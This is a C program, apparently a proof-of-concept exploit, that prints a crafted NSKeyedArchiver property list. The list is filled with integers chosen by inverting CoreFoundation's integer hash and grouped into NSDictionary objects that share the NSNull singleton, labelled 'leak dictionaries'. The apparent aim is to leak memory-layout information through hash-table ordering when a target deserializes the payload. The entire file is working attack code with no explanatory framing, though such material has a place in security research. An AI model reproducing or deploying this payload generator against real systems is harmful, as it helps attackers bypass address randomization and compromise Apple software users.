#include "attacker-common.h"

static int find_mod_hash_value(int hashed_val, int mod) {
  for (int i=0; i<0x7fffffff; i++) {
    if (_CFHashInt(i) % mod == hashed_val)
      return i;
  }
  err(1, "unable to invert hash");
}

static void print_objects_array_contents(int *main_id) {
  // 0
  printf("<string>$null</string>\n");


/*
  printf("<dict>\n");
  printf("<key>$class</key><dict><key>CF$UID</key><integer>2</integer></dict>\n");

  printf("<key>NS.keys</key><array>\n");
  //...
  printf("</array>\n");

  printf("<key>NS.objects</key><array>\n");
  //...
  printf("</array>\n");
  printf("</dict>\n");
  */

  // 1: NSNull singleton
  printf("<dict><key>$class</key><dict><key>CF$UID</key><integer>4</integer></dict></dict>\n");


  // 2: class hierarchy of NSDictionary
  printf("<dict><key>$classes</key><array><string>NSDictionary</string><string>NSObject</string></array><key>$classname</key><string>NSDictionary</string></dict>\n");
  // 3: class hierarchy of NSArray
  printf("<dict><key>$classes</key><array><string>NSArray</string><string>NSObject</string></array><key>$classname</key><string>NSArray</string></dict>\n");
  // 4: class hierarchy of NSNull
  printf("<dict><key>$classes</key><array><string>NSNull</string><string>NSObject</string></array><key>$classname</key><string>NSNull</string></dict>\n");


  // 5..: leak dictionaries
  int cur_index = 5;
  int array_indices[(LAST_PRIME_IDX-FIRST_PRIME_IDX+1)*2];
  int array_indices_idx = 0;
  for (int prime_idx = FIRST_PRIME_IDX; prime_idx <= LAST_PRIME_IDX; prime_idx++) {
    int prime = __CFBasicHashTableSizes[prime_idx];
    int numbers_idx = cur_index;
    for (int i=0; i<prime; i++) {
      int val = find_mod_hash_value(i, prime);
      printf("<integer>%d</integer>\n", val);
    }
    cur_index += prime;


    // first NSDictionary: even numbers plus NSNull
    printf("<dict>\n");
    printf("<key>$class</key><dict><key>CF$UID</key><integer>2</integer></dict>\n");

    printf("<key>NS.keys</key><array>\n");
    for (int i=0; i<prime; i+=2)
      printf("<dict><key>CF$UID</key><integer>%d</integer></dict>\n", numbers_idx+i);
    printf("<dict><key>CF$UID</key><integer>1</integer></dict>\n");
    printf("</array>\n");

    printf("<key>NS.objects</key><array>\n");
    for (int i=0; i<prime; i+=2)
      printf("<dict><key>CF$UID</key><integer>%d</integer></dict>\n", numbers_idx+i);
    printf("<dict><key>CF$UID</key><integer>1</integer></dict>\n");
    printf("</array>\n");
    printf("</dict>\n");
    array_indices[array_indices_idx++] = cur_index;
    cur_index++;

    // second NSDictionary: odd numbers plus NSNull
    printf("<dict>\n");
    printf("<key>$class</key><dict><key>CF$UID</key><integer>2</integer></dict>\n");

    printf("<key>NS.keys</key><array>\n");
    for (int i=1; i<prime; i+=2)
      printf("<dict><key>CF$UID</key><integer>%d</integer></dict>\n", numbers_idx+i);
    printf("<dict><key>CF$UID</key><integer>1</integer></dict>\n");
    printf("</array>\n");

    printf("<key>NS.objects</key><array>\n");
    for (int i=1; i<prime; i+=2)
      printf("<dict><key>CF$UID</key><integer>%d</integer></dict>\n", numbers_idx+i);
    printf("<dict><key>CF$UID</key><integer>1</integer></dict>\n");
    printf("</array>\n");
    printf("</dict>\n");
    array_indices[array_indices_idx++] = cur_index;
    cur_index++;
  }


  // main object: array of dictionaries
  *main_id = cur_index;
  printf("<dict>\n");
  printf("<key>$class</key><dict><key>CF$UID</key><integer>3</integer></dict>\n");

  printf("<key>NS.objects</key><array>\n");
  for (int i=0; i<array_indices_idx; i++)
    printf("<dict><key>CF$UID</key><integer>%d</integer></dict>\n", array_indices[i]);
  printf("<dict><key>CF$UID</key><integer>1</integer></dict>\n");
  printf("</array>\n");
  printf("</dict>\n");
}

int main() {
  printf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
  printf("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
  printf("<plist version=\"1.0\">\n");
  printf("<dict>\n");


  printf("<key>$archiver</key>\n");
  printf("<string>NSKeyedArchiver</string>\n");

  printf("<key>$objects</key>\n");
  printf("<array>\n");
  int main_id;
  print_objects_array_contents(&main_id);
  printf("</array>\n");

  printf("<key>$top</key><dict><key>root</key><dict><key>CF$UID</key><integer>%d</integer></dict></dict>\n", main_id);
  printf("<key>$version</key><integer>100000</integer>\n");


  printf("</dict>\n");
  printf("</plist>\n");
}
